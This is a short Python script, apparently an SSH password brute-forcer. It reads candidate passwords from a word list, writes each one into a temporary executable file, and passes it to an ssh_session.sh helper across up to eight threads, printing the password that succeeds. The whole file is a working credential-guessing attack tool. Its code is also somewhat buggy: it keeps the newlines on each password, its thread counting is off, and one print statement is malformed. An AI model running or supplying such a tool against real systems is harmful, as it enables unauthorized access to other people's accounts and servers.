#! /usr/bin/env python3

from threading import Thread
import subprocess
import time

def passwordFoundCallback(sharedO, password):
    sharedO.setFound()
    print ("GoodPassword: " + password)

class sharedThings():
    def __init__(self):
        self.threadCound = 0
        self.found = False
    def incthreadCount(self):
        self.threadCound += 1
    def decthreadCount(self):
        self.threadCound -= 1
    def getthreadCount(self):
        return self.threadCound
    def setFound(self):
        self.found = True
    def isFound(self):
        return self.found

class BruteForceTask(Thread):
    def __init__(self, password, sharedO):
        Thread.__init__(self)
        self.password = password
        self.sharedO = sharedO


    def run(self):
        try:
            f = open(self.password, "w+")
            f.write("echo " + self.password)
            f.close()
            subprocess.check_output(["chmod", "+x", self.password])
            time.sleep(0.1)
            print ("trying with password: " + self.password)
            subprocess.check_output(["./ssh_session.sh", self.password])
            subprocess.check_output(["rm", self.password])
            passwordFoundCallback(self.sharedO, self.password)
        except:
            subprocess.check_output(["rm", self.password])
            self.sharedO.decthreadCount()
            return -1

threadLimit = 8
sharedO = sharedThings()
ind = 0
with open("./passwords.txt") as f:
    for line in f:
        ind += 1
        if ind % 250 == 0:
            print ("tried %d combinaisons", ind)
        t = BruteForceTask(line, sharedO)
        t.start()
        time.sleep(0.3)
        sharedO.incthreadCount()
        while threadLimit < sharedO.getthreadCount():
            time.sleep(1)
        if sharedO.isFound():
            break



